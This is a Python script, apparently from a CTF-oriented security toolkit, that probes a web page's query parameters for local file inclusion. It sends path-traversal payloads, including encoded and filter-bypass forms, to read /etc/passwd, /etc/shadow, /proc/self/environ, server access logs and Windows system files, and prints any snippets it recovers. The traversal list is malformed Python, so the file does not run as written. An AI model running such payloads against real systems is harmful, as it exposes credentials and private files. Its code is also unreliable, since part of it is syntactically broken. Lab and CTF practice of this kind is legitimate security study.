#!/usr/bin/env python3
"""
web/lfi_checker.py — Local File Inclusion (LFI) detection for CTF
NuRichter · CySec Arsenal

Usage:
    python web/lfi_checker.py -u "http://target.ctf/page?file=home"
    python web/lfi_checker.py -u "http://target.ctf/page?file=home" --param file --deep
"""
import argparse
import sys
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from utils import ok, warn, err, info, found, get_logger

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Install: pip install requests")
    sys.exit(1)

log = get_logger("lfi_checker")

HEADERS = {"User-Agent": "Mozilla/5.0 (cysec-arsenal/1.0 CTF)"}

# File content signatures to confirm LFI
LFI_SIGNATURES = {
    "/etc/passwd":          ["root:x:", "daemon:", "bin:"],
    "/etc/shadow":          ["root:$", "daemon:!"],
    "/etc/hosts":           ["localhost", "127.0.0.1"],
    "/proc/version":        ["linux version", "gcc"],
    "/proc/self/cmdline":   ["python", "php", "apache"],
    "C:/Windows/win.ini":   ["[fonts]", "[extensions]"],
    "C:/boot.ini":          ["[boot loader]", "[operating systems]"],
    "/var/log/apache2/access.log": ["GET /", "HTTP/1."],
    "/var/log/nginx/access.log":   ["GET /", "HTTP/1."],
}

TRAVERSAL_PREFIXES = [
    "../" * d for d in range(1, 9)
] + [
    "..%2F" * d for d in range(1, 6),
    "..%252F" * d for d in range(1, 4),
    "....//",
    ".././",
    "..;/",
]

TARGET_FILES_LINUX = ["/etc/passwd", "/etc/hosts", "/proc/version",
                      "/proc/self/environ", "/var/log/apache2/access.log",
                      "/var/log/nginx/access.log"]
TARGET_FILES_WIN   = ["C:/Windows/win.ini", "C:/boot.ini",
                      "C:/Windows/System32/drivers/etc/hosts"]


class LFIChecker:
    def __init__(self, url: str, param: str = "", deep: bool = False,
                 timeout: float = 8.0):
        self.url = url
        self.target_param = param
        self.deep = deep
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = False
        self.findings: list[dict] = []

    def _params(self) -> list[str]:
        qs = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(self.url).query))
        if self.target_param and self.target_param in qs:
            return [self.target_param]
        return list(qs.keys())

    def _inject(self, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        return parsed._replace(query=urllib.parse.urlencode(qs)).geturl()

    def _get(self, url: str) -> str:
        try:
            resp = self.session.get(url, timeout=self.timeout)
            return resp.text
        except Exception:
            return ""

    def test_param(self, param: str):
        target_files = TARGET_FILES_LINUX + (TARGET_FILES_WIN if self.deep else [])
        traversals = TRAVERSAL_PREFIXES[:4] if not self.deep else TRAVERSAL_PREFIXES

        for target_file in target_files:
            signatures = LFI_SIGNATURES.get(target_file, ["root:", "localhost"])
            for traversal in traversals:
                payload = traversal + target_file
                url = self._inject(param, payload)
                body = self._get(url)
                body_lower = body.lower()
                for sig in signatures:
                    if sig.lower() in body_lower:
                        msg = f"[LFI] param={param} file={target_file} sig={repr(sig)}"
                        print(found(msg))
                        log.warning(msg)
                        self.findings.append({
                            "param": param, "file": target_file,
                            "traversal": traversal, "payload": payload,
                            "signature": sig, "url": url,
                        })
                        # Extract snippet
                        idx = body_lower.find(sig.lower())
                        snippet = body[max(0, idx-20): idx+100].strip()
                        print(f"    Snippet: {repr(snippet[:80])}")
                        break  # next traversal

    def run(self) -> list[dict]:
        params = self._params()
        if not params:
            print(warn("No GET parameters detected."))
            return []
        print(info(f"Testing {len(params)} param(s) for LFI (deep={self.deep})\n"))
        for param in params:
            print(info(f"Parameter: {param}"))
            self.test_param(param)
        return self.findings


def main():
    parser = argparse.ArgumentParser(
        description="LFI Checker (CTF/Authorized) — NuRichter CySec Arsenal"
    )
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("--param", default="")
    parser.add_argument("--deep", action="store_true",
                        help="Extended traversal depths and Windows paths")
    parser.add_argument("--timeout", type=float, default=8.0)
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f"  URL   : {args.url}")
    print(f"  DEEP  : {args.deep}")
    print(f"{'='*60}\n")

    checker = LFIChecker(args.url, args.param, args.deep, args.timeout)
    findings = checker.run()

    print(f"\n{'='*60}")
    if findings:
        print(found(f"{len(findings)} LFI path(s) confirmed!"))
    else:
        print(ok("No LFI vectors detected."))
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
